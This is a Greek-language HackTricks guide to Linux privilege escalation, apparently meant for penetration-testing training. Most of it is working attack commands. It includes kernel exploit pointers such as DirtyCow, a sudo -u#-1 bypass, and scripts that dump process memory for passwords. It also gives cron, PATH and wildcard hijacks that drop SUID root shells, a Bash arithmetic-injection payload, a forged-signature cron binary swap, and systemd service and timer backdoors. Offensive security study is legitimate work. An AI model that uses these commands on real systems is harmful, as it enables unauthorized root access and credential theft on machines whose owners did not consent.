# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας ξεκινήσουμε με τη συλλογή πληροφοριών για το OS που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Αν έχετε **δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, μπορεί να μπορέσετε να hijack κάποιες libraries ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή API keys στις μεταβλητές περιβάλλοντος?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την kernel version και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή vulnerable kernel list και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις vulnerable kernel versions από αυτήν την ιστοσελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Τα εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση για kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση στο θύμα, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **αναζητήστε την kernel έκδοση στο Google**, ίσως η kernel έκδοσή σας να αναφέρεται σε κάποιο kernel exploit και έτσι θα βεβαιωθείτε ότι αυτό το exploit είναι έγκυρο.

Επιπλέον τεχνικές kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του sudo πριν την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να κλιμακώσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από κατάλογο ελεγχόμενο από τον χρήστη.

Εδώ υπάρχει ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν τρέξετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι vulnerable και ότι υποστηρίζει τη λειτουργία `chroot`.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: η επαλήθευση της υπογραφής απέτυχε

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτό το vuln θα μπορούσε να εκμεταλλευτεί.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη αναγνώριση συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Απαρίθμηση πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν **any compiler is installed**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το compile στη μηχανή όπου σκοπεύετε να το χρησιμοποιήσετε (ή σε μία παρόμοια).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευάλωτο Λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να αξιοποιηθεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα τις εκδόσεις του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που τις περισσότερες φορές θα είναι άχρηστες, επομένως συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Processes

Ρίξτε μια ματιά σε **τις διεργασίες** που εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια από όσα θα έπρεπε** (ίσως ένα tomcat να εκτελείται από τον root?)
```bash
ps aux
ps -ef
top -n 1
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). Το **Linpeas** εντοπίζει αυτούς ελέγχοντας την παράμετρο `--inspect` στη γραμμή εντολών της process.\
Επίσης **έλεγξε τα προνόμιά σου πάνω στα processes binaries**, ίσως να μπορέσεις να κάνεις overwrite κάποιο.

### Process monitoring

Μπορείς να χρησιμοποιήσεις εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθήσεις processes. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσεις vulnerable processes που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Process memory

Κάποιες υπηρεσίες ενός server αποθηκεύουν **credentials in clear text inside the memory**.\
Κανονικά θα χρειαστείς **root privileges** για να διαβάσεις τη μνήμη των processes που ανήκουν σε άλλους users, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είσαι ήδη root και θέλεις να ανακαλύψεις περισσότερα credentials.\
Ωστόσο, να θυμάσαι ότι **ως regular user μπορείς να διαβάσεις τη μνήμη των processes που σου ανήκουν**.

> [!WARNING]
> Σημείωσε ότι στις μέρες μας οι περισσότερες μηχανές **δεν επιτρέπουν ptrace by default**, πράγμα που σημαίνει ότι δεν μπορείς να dump άλλες processes που ανήκουν στον unprivileged user σου.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι processes μπορούν να debugαριστούν, εφόσον έχουν το ίδιο uid. Αυτή ήταν η κλασική λειτουργία του ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο η parent process μπορεί να debugαριστεί.
> - **kernel.yama.ptrace_scope = 2**: Μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Καμία process δεν μπορεί να traceαριστεί με ptrace. Μόλις οριστεί, χρειάζεται reboot για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Αν έχεις πρόσβαση στη μνήμη μιας FTP υπηρεσίας (για παράδειγμα) μπορείς να πάρεις το Heap και να ψάξεις μέσα για credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Σενάριο
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο PID, τα **maps δείχνουν πώς η μνήμη αντιστοιχίζεται μέσα στον εικονικό χώρο διευθύνσεων** της διεργασίας· δείχνουν επίσης τις **άδειες πρόσβασης κάθε αντιστοιχισμένης περιοχής**. Το ψευδο-αρχείο **mem** **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **να μετακινηθούμε στο αρχείο mem και να εξάγουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη συστημική **φυσική** μνήμη, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, `/dev/mem` είναι αναγνώσιμο μόνο από **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επανερμηνεία για το Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Μπορείτε να το βρείτε στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις root και να κάνετε dump τη διεργασία που ανήκει σε εσάς
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν διαπιστώσετε ότι η διαδικασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump τη process (δείτε τις παραπάνω ενότητες για να βρείτε διαφορετικούς τρόπους να dump τη memory μιας process) και να αναζητήσετε credentials μέσα στη memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από μερικά **γνωστά αρχεία**. Απαιτεί προνόμια root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                  | Όνομα διεργασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Εάν ένα web “Crontab UI” panel (alseambusher/crontab-ui) τρέχει ως root και είναι δεσμευμένο μόνο στο loopback, μπορείτε να το προσεγγίσετε μέσω SSH local port-forwarding και να δημιουργήσετε ένα privileged job για privesc.

Τυπική αλυσίδα
- Εντοπίστε port μόνο στο loopback (π.χ., 127.0.0.1:8000) και Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
- Backups/scripts με `zip -P <password>`
- systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel και login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε μια εργασία με υψηλά προνόμια και εκτέλεσέ την αμέσως (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε το Crontab UI ως root; περιορίστε το με έναν αφιερωμένο χρήστη και ελάχιστα δικαιώματα
- Bind to localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN; μην επαναχρησιμοποιείτε κωδικούς
- Αποφύγετε την ενσωμάτωση secrets σε unit files; χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για εκτελέσεις εργασιών on-demand


Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται ως root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root? use symlinks? να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε shell ως root χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί script με wildcard (Wildcard Injection)

Αν ένα script που εκτελείται από root έχει ένα “**\***” μέσα σε μια εντολή, μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε απρόβλεπτες ενέργειες (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard προηγείται μιας διαδρομής όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμα και** _**./\***_ **δεν είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Το Bash εκτελεί parameter expansion και command substitution πριν από την arithmetic evaluation σε ((...)), $((...)) και let. Εάν ένας root cron/parser διαβάζει untrusted log fields και τα τροφοδοτεί σε arithmetic context, ένας attacker μπορεί να inject ένα command substitution $(...) το οποίο εκτελείται ως root όταν τρέξει ο cron.

- Γιατί δουλεύει: Στο Bash, οι expansions γίνονται με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` υποκαθίσταται πρώτα (εκτελώντας την εντολή), και το υπόλοιπο numeric `0` χρησιμοποιείται για την arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Τυπικό ευάλωτο μοτίβο:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Εκμετάλλευση: Γράψτε attacker-controlled κείμενο στο parsed log ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ένα ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν τυπώνει στο stdout (ή κάντε redirect) ώστε η arithmetic να παραμένει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από root, μπορείτε πολύ εύκολα να αποκτήσετε ένα shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **directory όπου έχετε πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν symlink φάκελο προς κάποιον άλλον** που σερβίρει ένα script υπό τον έλεγχό σας
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Οι Blue teams μερικές φορές "sign" τα cron-driven binaries εξάγοντας (dumping) μια προσαρμοσμένη ELF section και κάνοντας grep για ένα vendor string πριν τα εκτελέσουν ως root. Αν το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείτε να leak το signing material, μπορείτε να πλαστογραφήσετε την section και να καταλάβετε το cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Αναδημιουργήστε το αναμενόμενο πιστοποιητικό χρησιμοποιώντας το leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Δημιουργήστε ένα κακόβουλο replacement (π.χ., drop a SUID bash, add your SSH key) και ενσωματώστε το πιστοποιητικό στην `.text_sig` ώστε το grep να περάσει:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite το scheduled binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περιμένετε για το επόμενο cron run· μόλις ο naive signature check περάσει, το payload σας τρέχει ως root.

### Frequent cron jobs

Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως να μπορέσετε να το εκμεταλλευτείτε και να escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε διαδικασία που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατό να δημιουργηθεί ένα cronjob **τοποθετώντας ένα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε τον carriage return χαρακτήρα):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Αρχεία _.service_ με δυνατότητα εγγραφής

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **εκκινεί**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι να επανεκκινηθεί το μηχάνημα).\
Για παράδειγμα δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Εκτελέσιμα αρχεία υπηρεσίας με δυνατότητα εγγραφής

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής στα binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors ώστε όταν οι υπηρεσίες ξαναεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Σχετικές Διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί ο **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, ίσως να μπορείτε να **αναβαθμίσετε τα δικαιώματα**. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **εκτελέσιμο** με **το ίδιο όνομα με το σχετικό binary της διαδρομής** μέσα στον φάκελο PATH του systemd στον οποίο μπορείτε να γράψετε, και όταν η υπηρεσία ζητήσει να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σας θα εκτελεστεί (χρήστες χωρίς προνόμια συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες, αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Χρονιστές**

Οι **Χρονιστές** είναι αρχεία μονάδων systemd των οποίων το όνομα τελειώνει σε `**.timer**` και που ελέγχουν αρχεία ή γεγονότα `**.service**`. Οι **Χρονιστές** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς παρέχουν ενσωματωμένη υποστήριξη για γεγονότα ημερολογίου και μονοτονικά χρονικά γεγονότα και μπορούν να τρέξουν ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονιστές με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι timers

Αν μπορείτε να τροποποιήσετε ένα timer, μπορείτε να το κάνετε να εκτελεί υπάρχουσες μονάδες του systemd.unit (όπως `.service` ή `.target`).
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι η μονάδα (Unit):

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτός ο timer. Το όρισμα είναι ένα unit name, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια service που έχει το ίδιο όνομα με την timer unit, εκτός από το επίθημα. (Βλέπε παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της timer unit να ονομάζονται ταυτόσημα, εκτός από το επίθημα.

Επομένως, για να καταχραστείτε αυτή την άδεια θα χρειαστεί να:

- Βρείτε κάποια systemd unit (όπως `.service`) που **εκτελεί ένα binary στο οποίο έχετε δικαίωμα εγγραφής**
- Βρείτε κάποια systemd unit που **εκτελεί μια relative path** και έχετε **δικαιώματα εγγραφής** πάνω στο **systemd PATH** (για να μιμηθείτε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τους timers με `man systemd.timer`.**

### **Ενεργοποίηση timer**

Για να ενεργοποιήσετε έναν timer χρειάζεστε προνόμια root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** σε ίδιες ή διαφορετικές μηχανές εντός μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία descriptor του Unix για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω `.socket` αρχείων.

Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας `.socket` αρχεία.

**Μάθετε περισσότερα για sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν διάφορες ενδιαφέρουσες παράμετροι:

